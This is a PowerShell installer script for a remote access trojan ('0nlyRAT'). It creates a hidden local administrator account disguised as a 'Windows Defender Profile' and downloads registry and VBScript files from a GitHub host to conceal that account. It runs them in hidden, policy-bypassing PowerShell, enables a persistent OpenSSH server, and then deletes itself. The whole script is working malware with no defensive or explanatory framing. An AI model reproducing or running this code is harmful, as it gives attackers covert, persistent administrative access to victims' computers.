function random_text{
    return -join ((65..90) + (97..122)|Get-Random -Count 5|%{[char]$_})
}

# Create local admin for the rat
function create_account {
    [CmdletBinding()]
    param (
        [string] $xf061name,
        [securestring] $xf061pass
    )    
    begin {
    }    
    process {
        New-LocalUser "$xf061name" -Password $xf061pass -FullName "$xf061name" -Description "Windows Defender Profile"
        # Write-Verbose "$xf061name local user crated"
        Add-LocalGroupMember -Group "Administrators" -Member "$xf061name"
        # Write-Verbose "$xf061name added to the local administrator group"
    }    
    end {
    }
}
# create admin user
$xf061name = random_text
$xf061pass = (ConvertTo-SecureString "0nlyRAT123" -AsPlainText -Force)
create_account -xf061name $xf061name -xf061pass $xf061pass

# Variables
$directory = random_text
$temp_dir = "$env:TEMP\$directory"
# save current directory
$curr_dir = Get-Location|%{$_.Path}

# goto temp and make working directory
mkdir $temp_dir
cd $temp_dir


# Download registry to hide local admin
$reg_file = random_text
iwr -Uri "https://raw.githubusercontent.com/Soumyo001/Project-0nlyRAT/refs/heads/main/files/admin.reg" -OutFile ".\$reg_file.reg"

# Download VbScript file which will automate our registry entry
$vbs_file = random_text
iwr -Uri "https://raw.githubusercontent.com/Soumyo001/Project-0nlyRAT/refs/heads/main/files/confirm.vbs" -OutFile ".\$vbs_file.vbs"

# execute the registry entry process
# .\"$reg_file.reg";"$vbs_file.vbs"
powershell -noP -ep bypass -w hidden Start-Process powershell.exe -windowstyle hidden ".\$reg_file.reg;.\$vbs_file.vbs"

# enable persistent ssh
# Install the OpenSSH Server feature
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0

# Start the OpenSSH Server service
Start-Service sshd

# Set the service to start automatically on boot
Set-Service -Name sshd -StartupType Automatic

# Verify that the service is running
# Get-NetFirewallRule -Name *ssh*

# navigate to the saved directory and self delete
cd $curr_dir
del install.ps1